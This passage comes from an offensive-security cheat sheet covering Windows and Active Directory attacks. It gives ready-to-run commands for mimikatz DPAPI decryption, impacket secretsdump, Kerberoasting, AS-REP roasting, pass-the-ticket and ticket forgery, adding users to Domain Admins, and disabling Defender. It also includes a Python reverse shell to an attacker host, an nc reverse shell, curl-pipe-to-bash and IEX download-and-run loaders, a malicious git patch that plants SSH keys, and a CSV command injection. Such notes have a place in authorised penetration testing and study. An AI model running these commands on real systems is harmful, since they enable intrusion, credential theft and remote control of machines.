-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d                                 
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb                                                                                             
-a-hs-         1/17/2024   3:43 PM             24 Preferred
```

### Decryption with mimikatz

#### rpc

```c
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
```

```c
mimikatz # dpapi::cache
```

```c
mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"
```

## enum4linux

> https://github.com/CiscoCXSecurity/enum4linux

```c
$ enum4linux -a <RHOST>
```

## enum4linux-ng

> https://github.com/cddmp/enum4linux-ng

```c
$ enum4linux-ng -A <RHOST>
```

## env

```c
$ env
```

## Evil-WinRM

> https://github.com/Hackplayers/evil-winrm

```c
$ evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
```

```c
*Evil-WinRM* PS C:\> menu
```

### Using Certificate and Private Key

```c
$ evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
```

### Deactivate Windows Defender

```c
$ Set-MpPreference -DisableRealtimeMonitoring $true
```

### PowerView

> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

```c
PS C:\> powershell -ep bypass
PS C:\> . .\PowerView.ps1
```

### Common Commands

```c
PS C:\> Find-InterestingDomainAcl -ResolveGuids
```

### Example

```c
PS C:\> Import-Module .\PowerView.ps1
PS C:\> $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
PS C:\> Add-DomainGroupMember -Identity 'Domain Admins' -Members '<USERNAME>' -Credential $cred
```

### Check User

```c
PS C:\> Get-DomainUser <USERNAME> -Credential $cred
```

### Code Execution

```c
PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { whoami; hostname }
```

### Find a File

```c
PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { gci -recurse C:\Users <FILE>.txt }
```

### Read a File

```c
PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { cat \PATH\TO\FILE\<FILE>.txt }
```

### Remove a User from a Group

```c
PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { net group "Domain Admins" <USERNAME> /del }
```

## Excel

### .csv Files Command Injection

If the file get's parsed on a Linux operationg system, commands can be injected to the rows.

```c
$ echo '" --exec="\!/dev/shm/<FILE>"' >> /PATH/TO/FILE/<FILE>.csv
```

## find

### Specific Size

```c
$ find / -size 50M    // find files with a size of 50MB
```

### Modified Files

```c
$ find / -mtime 10    // find modified files in the last 10 days
$ find / -atime 10    // find accessed files in the last 10 days
$ find / -cmin -60    // find files changed within the last 60 minutes
$ find / -amin -60    // find files accesses within the last 60 minutes
```

### Passwords

```c
$ find ./ -type f -exec grep --color=always -i -I 'password' {} \;
```

### Group Permissions

```c
$ find / -group <group> 2>/dev/null
```

### User specific Files

```c
$ find / -user <USERNAME> 2>/dev/null
$ find / -user <USERNAME> -ls 2>/dev/null
$ find / -user <USERNAME> 2>/dev/null | grep -v proc 2>/dev/null
$ find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
```

### SUID and SGID Files

```c
$ find / -perm -4000 2>/dev/null
$ find / -perm -4000 2>/dev/null | xargs ls -la
$ find / -type f -user root -perm -4000 2>/dev/null
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

## FullPowers

> https://github.com/itm4n/FullPowers

```c
PS C:\> .\FullPowers.exe -x
PS C:\> .\FullPowers.exe -c "C:\nc64.exe <LHOST> <LPORT> -e cmd" -z
```

## functions

- Bash <4.2-048

```c
$ function /usr/sbin/<BINARY> { /bin/bash -p; }
$ export -f /usr/sbin/<BINARY>
$ /usr/sbin/<BINARY>
```

## gdbus

### Privilege Escalation

> https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/

```c
$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true
```

## gem

```c
$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
```

## Git

### Git apply (Malicious Patch) Privilege Escalation

#### Payload

```c
diff --git a/x b/../../../home/<USERNAME>/.ssh/authorized_keys
new file mode 100400
index 0000000..a3d61a0
--- /dev/null
+++ b/../../../home/<USERNAME>/.ssh/authorized_keys
@@ -0,0 +1 @@
+<SSH_PUBLIC_KEY>
```

#### Execution

```c
$ git apply patch --unsafe-paths
```

### Git Attributes Privilege Escalation

> https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes#filters_b

Notice that I only found this within a CTF so far. The pre-requisites are
`git commit` get's executed via `script`.

#### Payload

```c
export RHOST="<LHOST>";export RPORT=<LPORT>;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

#### Execution

```c
$ git init
$ echo '*.c filter=indent' > .git/info/attributes
$ git config filter.indent.clean /tmp/<FILE>
$ sudo -u <USERNAME> git-commit.sh
```

## gMSADumper

> https://github.com/micahvandeusen/gMSADumper

```c
$ python3 gMSADumper.py -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -l dc.<DOMAIN>
```

## grep

```c
$ grep -R db_passwd
$ grep -roiE "password.{20}"
$ grep -oiE "password.{20}" /etc/*.conf
$ grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
```

## gsocket

### Shell

```c
$ bash -c "$(curl -fsSL gsocket.io/x)"
```

## Impacket

> https://github.com/fortra/impacket

### Library Protocols

> https://tools.thehacker.recipes/impacket

> https://wadcoms.github.io/

> https://www.kali.org/tools/impacket-scripts/

| Impacket Module | Description |
| --- | --- |
| impacket-addcomputer | It will add a computer account to the domain and set its password. The following command will create a new computer over the SMB by specifying the SAMR method. |
| impacket-atexec | It executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. |
| impacket-dcomexec | A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects. |
| impacket-dpapi | Allows decrypting vaults, credentials and masterkeys protected by DPAPI. |
| impacket-esentutl | An Extensible Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases (e.g. NTDS.dit). |
| impacket-exchanger | A tool for connecting to MS Exchange via RPC over HTTP v2. |
| impacket-findDelegation | Simple script to quickly list all delegation relationships (unconstrained, constrained, resource-based constrained) in an AD environment. |
| impacket-Get-GPPPassword | This example extracts and decrypts Group Policy Preferences passwords using streams for treating files instead of mounting shares. Additionally, it can parse GPP XML files offline. |
| impacket-GetADUsers | This script will gather data about the domain’s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes. |
| impacket-getArch | This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed by (ab)using a documented MSRPC feature. |
| impacket-GetNPUsers | This example will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR. |
| impacket-getPac | This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of [MS-SFU]’s S4USelf + User to User Kerberos Authentication. |
| impacket-getST | Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user. |
| impacket-getTGT | Given a password, hash or aesKey, this script will request a TGT and save it as ccache. |
| impacket-GetUserSPNs | This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat. |
| impacket-goldenPac | Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target. |
| impacket-karmaSMB | A SMB Server that answers specific file contents regardless of the SMB share and pathname specified. |
| impacket-keylistattack | This example implements the Kerberos Key List attack to dump credentials abusing RODCs and Azure AD Kerberos Servers. |
| impacket-kintercept | A tool for intercepting krb5 connections and for testing KDC handling S4U2Self with unkeyed checksum. |
| impacket-lookupsid | A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups. |
| impacket-machine_role | This script retrieves a host's role along with its primary domain details. |
| impacket-mimikatz | Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi. |
| impacket-mqtt_check | Simple MQTT example aimed at playing with different login options. Can be converted into a account/password brute forcer quite easily. |
| impacket-mssqlclient | Alternative method to execute cmd's on MSSQL. |
| impacket-mssqlinstance | Retrieves the instances names from the target host. |
| impacket-netview | Gets a list of the sessions opened at the remote hosts and keep track of them looping over the hosts found and keeping track of who logged in/out from remote servers. |
| impacket-nmapAnswerMachine | n/a |
| impacket-ntfs-read | NTFS format implementation. This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents. |
| impacket-ntlmrelayx | This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy. |
| impacket-ping | Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. If the remote host is up, it should reply to the echo probe with an echo-reply packet. |
| impacket-ping6 | Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. |
| impacket-psexec | PSEXEC like functionality example using RemComSvc (https://github.com/kavika13/RemCom) |
| impacket-raiseChild | This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. |
| impacket-rbcd | Example script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer. |
| impacket-rdp_check | [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. This example tests whether an account is valid on the target host. |
| impacket-reg | Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. The idea is to provide similar functionality as the REG.EXE Windows utility. |
| impacket-registry-read | A Windows Registry file format implementation. It allows to parse offline registry hives. |
| impacket-rpcdump | This script will dump the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints. |
| impacket-rpcmap | Scan for listening DCE/RPC interfaces. This binds to the MGMT interface and gets a list of interface UUIDs. If the MGMT interface is not available, it takes a list of interface UUIDs seen in the wild and tries to bind to each interface. |
| impacket-sambaPipe | This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through the -so parameter. |
| impacket-samrdump | An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service. |
| impacket-secretsdump | Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state. |
| impacket-services | This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC Interface. It supports start, stop, delete, status, config, list, create and change. |
| impacket-smbclient | A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It’s an excellent example to see how to use impacket.smb in action. |
| impacket-smbexec | A similar approach to PSEXEC w/o using RemComSvc. This implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available. |
| impacket-smbpasswd | This script is an alternative to smbpasswd tool and intended to be used for changing expired passwords remotely over SMB (MSRPC-SAMR). |
| impacket-smbrelayx | Exploit for CVE-2015-0005 using a SMB Relay Attack. If the target system is enforcing signing and a machine account was provided, the module will try to gather the SMB session key through NETLOGON. |
| impacket-smbserver | A Python implementation of an SMB server. Allows to quickly set up shares and user accounts. |
| impacket-sniff | Simple packet sniffer that uses the pcapy library to listen for packets in # transit over the specified interface. |
| impacket-sniffer | Simple packet sniffer that uses a raw socket to listen for packets in transit corresponding to the specified protocols. |
| impacket-split | n/a |
| impacket-ticketConverter | This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa. |
| impacket-ticketer | This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, ExtraSids, duration, etc. |
| impacket-wmiexec | A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy. |
| impacket-wmipersist | This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified. |
| impacket-wmiquery | It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account). |

### Common Commands

```c
$ impacket-atexec -k -no-pass <DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
$ impacket-dcomexec -object MMC20 -debug -silentcommand <DOMAIN>/<USERNAME>:'<PASSWORD>'<DOMAIN_CONTROLLER> '<COMMAND>'
$ impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
$ impacket-getST <DOMAIN>/<USERNAME>$ -spn WWW/<DOMAIN_CONTROLLER>.<DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
$ impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
$ impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <COMMAND> <COMMAND>
$ impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
$ impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
$ impacket-smbserver local . -smb2support
```

### impacket-smbclient

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
```

### impacket-getTGT

```c
$ impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
$ impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```

### impacket-GetNPUsers

```c
$ impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
$ impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
$ impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
```

### impacket-getUserSPNs

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
```

### impacket-secretsdump

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
$ impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
$ impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
$ impacket-secretsdump -dc-ip <RHOST> <DOMAIN>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### impacket-psexec

```c
$ impacket-psexec <USERNAME>@<RHOST>
$ impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

### impacket-ticketer

#### Requirements

* Valid User
* NTHASH
* Domain-SID

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
```

#### Fixing [-] exceptions must derive from BaseException

##### Issue

```c
$ impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<DOMAIN> -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

#### To fix it

```c
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```

### ntlmrelayx

```c
$ sudo ntlmrelayx.py -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
```

### dacledit.py

> https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py

```c
$ python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
```

#### Fixing msada_guids Error

```c
#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```

Then put the `msada_guids.py` into the same directory as `dacledit.py`

> https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py

### owneredit.py

> https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py

```c
$ python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
```

### ThePorgs Fork

```c
$ pipenv shell
$ git clone https://github.com/ThePorgs/impacket/
$ pip3 install -r requirements.txt
$ sudo python3 setup.py install
```

## Internet Information Service (IIS)

### Application Pool Credential Dumping

```c
C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
```

## JAWS

> https://github.com/411Hall/JAWS

```c
PS C:\> IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
```

## Kerberos

### Authentication

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/kerberos-authentication

If a user wants to obtain access to resources within a Active Directory network, he must obtain a ticket through a `6-step` process.

1. User sends a request to the `Kerberos Distribution Center (KDC)` with his password hash and a timestamp. (AS-REQ)
2. If the `password hash` of the user matches that for the user on the `KDC`, the user receives a `Ticket Granting Ticket` encrypted and signed by the `krbtgt` account. (AS-REP)
3. The `TGT`, including the `krbtgt hash`, is sent to the `KDC` or `DC` in order to recieve a `Kerberos Service Ticket (TGS)`. (TGS-REQ)
4. User then receives a `TGS` encrypted with the `hash` of the service account he wishes to access. (TGS-REP)
5. User then connects to the server and attempts to use the service he sent the `initial request` for with the `TGS` included. (AP-REQ)
6. User gains access and mutual authentication is given between the server and client if necessary (AP-REP).

#### Constrained Delegation

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/constrained-delegation

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation

- `Constrained Delegation` limits the services to which a service can access on behalf of a user.
- This service account must still be `trusted` to `delegate`.
- The user does `not authenticate` with `Kerberos` to the `constrained service`.
- Instead of authenticating to the `KDC` first, like in a regular Kerberos ticket request, the user authenticates `directly to the service`.
- Once the user authenticates to the service, the service then requests a `forwardable TGT` to the `KDC` without the user's password included.
- The `KDC` checks the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` attribute on the service and whether or not the user's account is blocked.
- If everything checks out a ticket is returned.
- Ticket gets `passed back` to the `KDC` and a `TGS ticket` is requested to the `second service`.
- `KDC` checks the `msDS-AllowedToDelegateTo` field on the second service and if it is listed, then an `access ticket` is granted.
- `TGS` gets sent to the next service and the user now can authenticate to it.

The `Service for User (S4U)` extension is used to aid the impersonation process when `Constrained Delegation` is used. The extension has two extensions within it:

- `Service for User to Self (S4U2Self)`: This allows a service to obtain a `forwardable TGS` to itself on the user's behalf with the `User Principal Name` supplied. No password is included.
- `Service for User to Proxy (S4U2proxy)`: This allows the service to `obtain` the required `TGS` on the user's behalf to the second service the user needs to connect to. This second service will have the `msDS-AllowedToDelegateTo` attribute given to it. User tokens can be forwarded to those `SPN's` which have this attribute given.

Delegation occurs not only for the specified service, but also for ANY service running under the account that is running the service.

#### Unconstrained Delegation

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/unconstrained-delegation

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation

Kerberos Delegation allows for users to access resources on another server via a service that the user has access to. The service the user is connected to impersonates that user by resusing his credentials which then allows the user to gain access to that server.

- When `Unconstrained Delegation` is enabled, the user's `TGT` is sent along with the `TGS` to the first hop service. That `TGT` gets stored in the server's `LSASS` which allows the service to take it out and delegate with it if necessary.
- Accounts or services with `Unconstrained Delegation` can be escalated to an account with higher privileges, if a Domain Admin or a higher privileged user connecting to that machine.
- The `TGT` can be extracted and the ticket `reused`.

#### Resource-based Constrained Delegation (RBCD)

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

> https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/

> https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview

- In `unconstrained` and `constrained Kerberos delegation`, a `computer/user` is told what resources it can delegate authentications to.
- In `Resource-based Kerberos Delegation`, computers (resources) specify who they `trust` and who can `delegate` authentications to them.
- By supporting constrained delegation across domains, `services` can be `configured` to use `constrained delegation` to `authenticate` to `servers` in other domains rather than using unconstrained delegation.
- This provides `authentication support` for across domain service solutions by using an existing Kerberos infrastructure `without` needing to trust `front-end services` to delegate to any service.

##### Prerequisites

- Populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute with a computer account that will be controlled.
- Know a `SPN` set on the object to gain access.
- Create a new `computer account` using PowerMad (allowed due to the default MachineAccountQuota value).
- Leverage Rubeus to abuse `Resource-Based Constrained Delegation`.

#### Kerberoasting

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/kerberoasting

> https://xedex.gitbook.io/internalpentest/internal-pentest/active-directory/post-compromise-attacks/kerberoasting

- All user accounts that have `Service Principal Names (SPN's)` set can be kerberoasted.
- Relatively silent technique because it leaves only one `4769 ID event` on the log.

#### AS-REP Roasting

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/as-rep-roasting

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat

ASPREPRoast is about retrieving crackable hashes from `KRB5 AS-REP` responses for users without `kerberoast preauthentication` enabled. This isn't as useful as Kerberoasting, as accounts have to have `DONT_REQ_PREAUTH` explicitly set for them to be vulnerable and you are still reliant upon weak password complexity for the attack to work.

- `AS-REP roasting` is a technique that allows retrieving password hashes for users that have `Do not require Kerberos preauthentication` property selected.
- Those hashes can then be cracked offline.

#### Silver, Golden and Diamond Tickets

- Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).
- Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).
- Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).

### Attacking Kerberos

> https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

#### Bruteforce

```c
$ ./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
```

##### With List of Users

```c
C:\> .\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
```

##### Check Passwords for all Users in Domain

```c
C:\> .\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
```

#### ASPREPRoast

##### Check ASPREPRoast for all Domain Users (Credentials required)

```c
$ impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
$ impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
```

##### Check ASPREPRoast for a List of Users (No Credentials required)

```c
$ impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
$ impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
```

##### Check ASPREPRoast for all Domain Users in Domain

```c
C:\> .\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

##### Kerberoasting

```c
$ impacketGetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
C:\> .\Rubeus.exe kerberoast /outfile:<FILE>
PS C:\> iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
PS C:\> Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
PS C:\> Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```

#### Overpass The Hash/Pass The Key (PTK)

##### Request TGT with Hash

```c
$ impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
```

##### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)

```c
$ impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
```

##### Request TGT with Password

```c
$ impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
```

##### Set TGT for Impacket Usage

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

##### Execute Remote Commands

```c
$ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### Ask and inject the Ticket

```c
C:\> .\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
```

##### Execute a CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

#### Pass The Ticket (PTT)

##### Harvest Tickets from Linux

###### Check Type and Location of Tickets

```c
$ grep default_ccache_name /etc/krb5.conf
```

* If none return, default is FILE:/tmp/krb5cc_%{uid}
* In Case of File Tickets it is possible to Copy-Paste them to use them
* In Case of being KEYRING Tickets, the Tool tickey can be used to get them
* To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
* To inject, the Ticket have to be copied in a reachable Folder by all Users

```c
$ cp tickey /tmp/tickey
$ /tmp/tickey -i
```

##### Harvest Tickets from Windows

```c
mimikatz # sekurlsa::tickets /export
$ .\Rubeus dump
```

##### Convert Tickets dumped with Rubeus into base64

```c
[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
```

##### Convert Tickets between Linux and Windows Format with ticket_converter.py

> https://github.com/Zer1t0/ticket_converter

```c
$ python ticket_converter.py ticket.kirbi ticket.ccache
$ python ticket_converter.py ticket.ccache ticket.kirbi
```

##### Using Ticket on Linux

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

##### Execute Remote Commands by using TGT

```c
$ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### Using Ticket on Windows

###### Inject Ticket with mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

###### Inject Ticket with Rubeus

```c
C:\> .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute a CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

#### Silver Ticket

##### Impacket Examples

###### Generate TGS with NTLM

```c
$ python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Generate TGS with aesKey

```c
$ python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Set the ticket for impacket use

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
$ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### mimikatz Examples

###### Generate TGS with NTLM

```c
